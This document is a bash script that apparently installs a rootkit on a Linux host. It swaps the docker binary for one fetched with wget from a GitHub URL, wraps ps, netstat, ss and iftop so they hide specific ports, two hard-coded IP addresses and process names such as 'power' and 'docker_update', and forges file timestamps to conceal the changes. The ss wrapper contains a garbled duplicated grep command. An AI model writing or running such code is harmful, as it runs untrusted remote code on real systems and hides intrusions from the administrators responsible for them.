#!/bin/bash
#find ps netstat ss iftop
if [  -f "/sbin/iftop2" ];then
        rm -rf /sbin/iftop
        mv /sbin/iftop2 /sbin/iftop
fi
if [  -f "/sbin/ntss" ];then
        rm -rf /sbin/ss
        mv /sbin/ntss /sbin/ss
fi
if [  -f "/bin/ntstat" ];then
        rm -rf /bin/netstat
        mv /bin/ntstat /bin/netstat
fi
if [  -f "/bin/efps" ];then
        rm -rf /bin/ps
        mv /bin/efps /bin/ps
fi
if [  -f "/usr/bin/docker-ce" ];then
        rm -rf /usr/bin/docker
        mv /usr/bin/docker-ce /usr/bin/docker
fi

echo >  /etc/yum/yum-update.rc
# update docker
mv /usr/bin/docker /usr/bin/docker-ce
wget -O /usr/bin/docker https://raw.githubusercontent.com/jackmoc/update/main/docker/docker >/dev/null 2>&1
chmod +x /usr/bin/docker
touch -r /usr/bin/docker-ce /usr/bin/docker
#update iftop
cd /sbin/
mv iftop iftop2
echo '#!/bin/bash
iftop2 $* -f "port not 443 and port not 5353 and port not 5000 and port not 38824 and host not 150.109.185.45 and host not 13.213.63.209"' > iftop
chmod +x iftop
touch -r iftop2 iftop
#update netstat
#netstat
mv /bin/netstat /bin/ntstat
cd /bin/
echo '#!/bin/bash
/bin/ntstat $* | grep -Ev "3306|443|5000|5353|38824|13.213.63.209|150.109.185.45|bash|docker_update|power"' > netstat
chmod 755 netstat
touch -r /bin/ntstat /bin/netstat
#ss
mv /sbin/ss /sbin/ntss
cd /sbin/
echo '#!/bin/bash
/sbin/ntss $* | grep -Ev grep -Ev "3306|443|5000|5353|38824|13.213.63.209|150.109.185.45|bash|docker_update|power"' > /sbin/ss
chmod +x /sbin/ss
touch -r /sbin/ntss /sbin/ss
#ps
mv /bin/ps /bin/efps
cd /bin/
echo '#!/bin/bash
/bin/efps $* | grep -Ev "power|docker_check|node_static|docker_update"' > /bin/ps
chmod +x /bin/ps
touch -r /bin/efps /bin/ps
